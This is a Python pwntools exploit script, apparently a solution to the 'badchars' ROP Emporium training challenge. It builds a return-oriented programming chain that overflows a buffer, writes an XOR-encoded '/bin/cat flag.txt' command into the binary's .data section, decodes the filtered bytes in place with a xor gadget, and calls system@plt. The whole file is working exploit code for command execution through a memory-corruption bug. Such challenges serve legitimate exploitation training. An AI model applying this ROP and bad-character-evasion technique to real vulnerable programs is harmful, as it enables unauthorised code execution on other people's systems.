from pwn import *


# context.log_level = "debug"

def xorstring(instring, key):
	instringbytes = bytearray(instring)
	returndata = ""
	badchars = [0x62,0x69,99,0x2f,0x20,0x66,0x6e,0x73]
	xorindices = []

	for i in range(len(instringbytes)):
		if instringbytes[i] in list(badchars):
			xorval = instringbytes[i] ^ key
			returndata += chr(xorval)
			xorindices.append(i)
		else:
			returndata += chr(instringbytes[i])

	return returndata,xorindices


def split_string(string):
	return [string[i:i+8] for i in range(0,len(string),8)]

def pad_string(string):
	string += "\x00"
	while len(string) % 8 != 0:
		string += "\x00"
	return string


def write_padded_string_to_address(mov_gadget, pop_gadget, string_address, string_split):
	returndata = ""
	for i in range(len(string_split)):
		returndata += p64(pop_gadget) # pop r12; pop r13; ret;
		returndata += string_split[i] # pop r12
		returndata += p64(string_address + (i*8)) # pop r13
		returndata += p64(mov_gadget) # mov [r13], r12
	return returndata

def xor_memory_at_address(pop_gadget, xor_gadget, address, key, index):
	returndata = ""
	returndata += p64(pop_gadget) # pop r14; pop r15; ret;
	returndata += p64(key) # r14
	returndata += p64(address + index) # r15
	returndata += p64(xor_gadget) # xor byte ptr [r15], r14b; ret;
	return returndata


e = ELF("badchars")
p = process(e.path)
# p = gdb.debug(e.path,"b *0x4009dd\ncontinue\n") # leave of pwnme
# p = gdb.debug(e.path,"b *0x400b30\ncontinue\n") # xor_r15_r14b

system_plt   = 0x4006f0 # system@plt
section_data = 0x601080 # .data
pop_rdi      = 0x400b39 # pop rdi; ret;
pop_r14_r15  = 0x400b40 # pop r14; pop r15; ret;
xor_r15_r14b = 0x400b30 # xor byte ptr [r15], r14b; ret;
mov_r13_r12  = 0x400b34 # mov qword ptr [r13], r12; ret;
pop_r12_r13  = 0x400b3b # pop r12; pop r13; ret;

junk         = 'A' * 40
key          = 0xa9
command      = "/bin/cat flag.txt"
command_pad  = pad_string(command)
command_xor,xorindices  = xorstring(command_pad,key)
command_spl  = split_string(command_xor)

# Write junk
# Write xor'd string in to memory
# xor data in memory to restore original value
# Call system with retore'd data

chain = junk
chain += write_padded_string_to_address(mov_r13_r12, pop_r12_r13, section_data, command_spl)
for index in xorindices:
	chain += xor_memory_at_address(pop_r14_r15, xor_r15_r14b, section_data, key, index) # len of 8 byte chunks
chain += p64(pop_rdi)
chain += p64(section_data)
chain += p64(system_plt)

# print(len(chain))

p.sendline(chain)
print(p.readall())
